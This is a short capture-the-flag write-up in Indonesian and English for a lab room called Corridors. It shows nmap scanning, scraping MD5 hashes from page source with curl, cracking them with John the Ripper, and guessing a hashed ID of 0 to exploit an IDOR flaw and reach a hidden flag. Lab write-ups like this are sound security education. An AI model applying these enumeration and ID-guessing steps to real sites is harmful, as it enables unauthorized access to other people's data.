<img width="908" height="224" alt="image" src="https://github.com/user-attachments/assets/8fe6a4f8-274b-4d0c-ae6f-96c0a8785f95" />
Corridors Writeup - IDOR Vulnerability
1. Scanning
Pertama, lakukan pemindaian target untuk melihat layanan yang berjalan.
Scanning
scan the target
<img width="342" height="83" alt="image" src="https://github.com/user-attachments/assets/a885dc50-13ab-411d-aa9f-4f4409062079" />
bash```nmap -sS -sV 10.10.225.145```
<img width="415" height="70" alt="image" src="https://github.com/user-attachments/assets/e35af6d2-892f-45eb-adc4-e1fe65f3e2e8" />
HTTP
go to the webpage, we can see a corridor with a lot of door can open
<img width="951" height="580" alt="image" src="https://github.com/user-attachments/assets/a3cc5328-c3e1-495a-9e4e-4f6e0feda073" />

2. HTTP Exploration
Mengunjungi halaman web utama menampilkan sebuah lorong dengan banyak pintu yang bisa dibuka.
Saat memeriksa source code (view-source), terlihat bahwa setiap pintu memiliki nilai hash yang unik.

<img width="1202" height="521" alt="image" src="https://github.com/user-attachments/assets/da026b96-62c2-44c5-ad2d-07dd8d5627c0" />

3. Enumeration
Kumpulkan semua hash tersebut untuk dianalisis lebih lanjut menggunakan perintah berikut:
bash
```curl http://10.48.147.213 | grep 'alt' | cut -d '"' -f4 > hash.txt```

4. Cracking
Lakukan cracking pada hash yang ditemukan menggunakan John the Ripper. 
bash
```john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```
Hasilnya menunjukkan bahwa semua endpoint URL yang di-hash adalah angka berurutan dari 1 sampai 13.

5. Exploitation (IDOR)
Berdasarkan temuan tersebut, ada indikasi kerentanan IDOR (Insecure Direct Object Reference). Saya mencoba membuat hash untuk angka di luar rentang tersebut, seperti 0 atau 14.
bash
```echo -n 14 | md5sum```
```echo -n 0 | md5sum```
<img width="369" height="86" alt="image" src="https://github.com/user-attachments/assets/08f8bc45-d5c1-4569-b61c-57c6608ff4ff" />
Tidak ada apa-apa di ruangan 14, namun ditemukan sebuah flag di ruangan 0:
bash
```http://10.48.147.213/cfcd208495d565ef66e7dff9f98764da```
<img width="1128" height="569" alt="image" src="https://github.com/user-attachments/assets/ba54fa4e-a73f-406d-a0e7-9d463b41671f" />
